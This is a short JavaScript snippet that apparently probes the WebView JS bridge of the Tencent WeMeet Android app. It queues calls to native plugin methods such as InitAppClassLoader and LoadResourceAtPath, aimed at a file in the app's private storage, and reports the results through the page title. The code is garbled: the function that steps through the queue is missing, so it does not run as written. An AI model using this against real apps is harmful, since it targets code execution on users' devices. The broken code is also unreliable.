<script>
(function(){
  document.title='P141MAIN:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P141MCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P141MAIN-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P141MAIN-NOMGR:'+location.host;return}
  var zip='/data/user/0/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['CL','CommonPlugin','InitAppClassLoader',{path:zip, file_path:zip, url:zip, apk_path:zip}],
    ['GS','CommonPlugin','GetWebViewSharePath',{}],
    ['LR','CommonPlugin','LoadResourceAtPath',{path:zip, file_path:zip, url:zip}],
    ['LE','CommonPlugin','LoadEmbeddedElement',{path:zip, file_path:zip, url:zip, element_id:'file'}]
  ];
  var i=0;

    if(i>=q.length){document.title='P141MAIN-DONE:'+location.host;return}

    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 1200);
})();
</script>
